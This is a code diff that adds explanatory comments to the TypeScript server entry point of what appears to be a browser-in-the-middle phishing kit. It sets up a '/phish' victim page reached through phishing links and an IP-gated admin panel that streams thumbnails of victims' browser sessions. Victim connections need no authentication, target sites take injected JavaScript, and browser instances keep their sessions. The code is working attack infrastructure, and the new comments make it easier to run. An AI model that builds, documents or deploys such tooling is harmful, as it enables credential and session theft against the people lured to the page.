@@ -11,8 +11,14 @@ import { registerSocketHandlers } from './socket-handlers.js';
 
 const __dirname = dirname(fileURLToPath(import.meta.url));
 
-// ─── Config schemas ───────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════
+// Configuration Validation Schemas
+// ═══════════════════════════════════════════════════════════════════════════════
 
+/**
+ * Zod schema for validating config.json structure.
+ * Ensures all required fields are present and have correct types.
+ */
 const ConfigSchema = z.object({
   default_user_agent: z.string(),
   socket_key: z.string().min(8),
@@ -20,6 +26,9 @@ const ConfigSchema = z.object({
   proxy: z.string().nullable(),
 });
 
+/**
+ * Zod schema for validating individual target configuration.
+ */
 const TargetSchema = z.object({
   name: z.string(),
   url: z.string().url(),
@@ -28,30 +37,55 @@ const TargetSchema = z.object({
   inject_js: z.string().optional(),
 });
 
+/**
+ * Zod schema for validating targets.json structure.
+ * Expects a record/object where keys are target IDs and values are Target objects.
+ */
 const TargetsSchema = z.record(TargetSchema);
 
-// ─── Load config ──────────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════
+// Configuration Loading
+// ═══════════════════════════════════════════════════════════════════════════════
 
+/**
+ * Loads and validates the main application configuration from config.json.
+ * 
+ * @returns Validated Config object
+ * @throws Error if config.json is missing, malformed, or fails validation
+ */
 async function loadConfig(): Promise<Config> {
   const configPath = join(__dirname, '..', 'config.json');
   const raw = await readFile(configPath, 'utf-8');
   return ConfigSchema.parse(JSON.parse(raw));
 }
 
+/**
+ * Loads and validates target site configurations from targets.json.
+ * 
+ * @returns Record mapping target IDs to Target configurations
+ * @throws Error if targets.json is missing, malformed, or fails validation
+ */
 async function loadTargets(): Promise<Record<string, Target>> {
   const targetsPath = join(__dirname, '..', 'targets.json');
   const raw = await readFile(targetsPath, 'utf-8');
   return TargetsSchema.parse(JSON.parse(raw));
 }
 
-// ─── Main ─────────────────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════
+// Main Server Initialization
+// ═══════════════════════════════════════════════════════════════════════════════
 
+/**
+ * Main application entry point.
+ * Initializes Fastify server, Socket.IO, browser manager, and all routes.
+ */
 async function main(): Promise<void> {
+  // Load configuration files in parallel for faster startup
   const [config, targets] = await Promise.all([loadConfig(), loadTargets()]);
 
   const publicDir = join(__dirname, '..', 'public');
 
-  // ─── Fastify setup ──────────────────────────────────────────────────────────
+  // ─── Fastify HTTP Server Setup ──────────────────────────────────────────────
 
   const fastify = Fastify({
     logger: {
@@ -60,13 +94,22 @@ async function main(): Promise<void> {
     },
   });
 
-  // Serve static files from public/
+  // Serve static files (HTML, CSS, JS) from public/ directory
   await fastify.register(fastifyStatic, {
     root: publicDir,
     prefix: '/',
   });
 
-  // Socket.IO — attached directly to the underlying HTTP server
+  // ─── Socket.IO Setup ────────────────────────────────────────────────────────
+
+  /**
+   * Socket.IO server attached to Fastify's underlying HTTP server.
+   * 
+   * Configuration:
+   * - CORS: Allow all origins (adjust for production)
+   * - Transport: WebSocket only (polling mangles binary frame data)
+   * - Type-safe: Uses TypeScript event maps for compile-time safety
+   */
   const io = new Server<ClientToServerEvents, ServerToClientEvents, Record<string, never>, SocketData>(
     fastify.server,
     {
@@ -75,14 +118,23 @@ async function main(): Promise<void> {
     },
   );
 
-  // ─── Routes ─────────────────────────────────────────────────────────────────
+  // ─── HTTP Routes ────────────────────────────────────────────────────────────
 
-  // Serve victim page
+  /**
+   * GET /phish
+   * Serves the victim page (victim.html).
+   * This is the page victims are redirected to via phishing links.
+   */
   fastify.get('/phish', async (_req, reply) => {
     return reply.sendFile('victim.html');
   });
 
-  // Serve admin page (IP-gated)
+  /**
+   * GET /admin
+   * Serves the admin control panel (admin.html).
+   * Access is restricted to IPs listed in config.admin_ips.
+   * Use ['*'] in config to allow all IPs (development only).
+   */
   fastify.get('/admin', async (req, reply) => {
     const ip = req.ip;
     if (!config.admin_ips.includes(ip) && !config.admin_ips.includes('*')) {
@@ -91,16 +143,30 @@ async function main(): Promise<void> {
     return reply.sendFile('admin.html');
   });
 
-  // Health check
+  /**
+   * GET /healthz
+   * Health check endpoint for monitoring/load balancers.
+   * Returns 200 OK with JSON status.
+   */
   fastify.get('/healthz', async () => ({ status: 'ok' }));
 
-  // ─── Socket.IO auth middleware ───────────────────────────────────────────────
+  // ─── Socket.IO Authentication Middleware ────────────────────────────────────
 
+  /**
+   * Socket.IO middleware for authentication and role assignment.
+   * 
+   * Authentication flow:
+   * - Admin: Must connect from allowed IP AND provide correct socket_key
+   * - Victim: No authentication required (by design)
+   * 
+   * Sets socket.data.isAdmin based on authentication result.
+   */
   io.use((socket, next) => {
     const auth = socket.handshake.auth as { password?: string; isAdmin?: boolean };
     const ip = socket.handshake.address;
 
     if (auth.isAdmin) {
+      // Admin authentication: check IP whitelist AND socket key
       const isAdminIp =
         config.admin_ips.includes(ip) || config.admin_ips.includes('*');
       const hasCorrectKey = auth.password === config.socket_key;
@@ -109,23 +175,37 @@ async function main(): Promise<void> {
       }
       socket.data.isAdmin = true;
     } else {
+      // Victim: no authentication required
       socket.data.isAdmin = false;
     }
 
     return next();
   });
 
-  // ─── Browser manager + socket handlers ──────────────────────────────────────
+  // ─── Browser Manager Initialization ─────────────────────────────────────────
 
+  /**
+   * Initialize browser manager with config and thumbnail callback.
+   * The thumbnail callback broadcasts thumbnails to all connected admins.
+   */
   initBrowserManager(config, (browserId, buf) => {
     io.to('admin').emit('thumbnail', { browserId, data: buf });
   });
 
+  /**
+   * Pre-warm a browser instance for faster victim onboarding.
+   * This creates a ready-to-use browser that can be claimed immediately
+   * when the first victim connects, reducing initial load time.
+   */
   await warmUp();
 
+  /**
+   * Register all Socket.IO event handlers for admin and victim connections.
+   * This sets up the bidirectional communication protocol.
+   */
   registerSocketHandlers(io, targets);
 
-  // ─── Start server ────────────────────────────────────────────────────────────
+  // ─── Start HTTP Server ──────────────────────────────────────────────────────
 
   const port = parseInt(process.env['PORT'] ?? '80', 10);
   const host = process.env['HOST'] ?? '0.0.0.0';
@@ -135,8 +215,16 @@ async function main(): Promise<void> {
   console.log(`[server] Admin panel: http://localhost:${port}/admin`);
   console.log(`[server] Victim page: http://localhost:${port}/phish\n`);
 
-  // ─── Graceful shutdown ────────────────────────────────────────────────────────
+  // ─── Graceful Shutdown Handler ──────────────────────────────────────────────
 
+  /**
+   * Graceful shutdown handler for SIGINT (Ctrl+C) and SIGTERM.
+   * 
+   * Cleanup sequence:
+   * 1. Close all browser instances (saves sessions, releases resources)
+   * 2. Close Fastify server (stops accepting new connections)
+   * 3. Exit process with code 0
+   */
   const shutdown = async () => {
     console.log('\n[server] Shutting down...');
     await closeAll();
@@ -148,6 +236,14 @@ async function main(): Promise<void> {
   process.on('SIGTERM', () => void shutdown());
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// Application Entry Point
+// ═══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Start the application.
+ * Catches and logs any fatal errors during initialization.
+ */
 main().catch((err) => {
   console.error('[server] Fatal error:', err);
   process.exit(1);
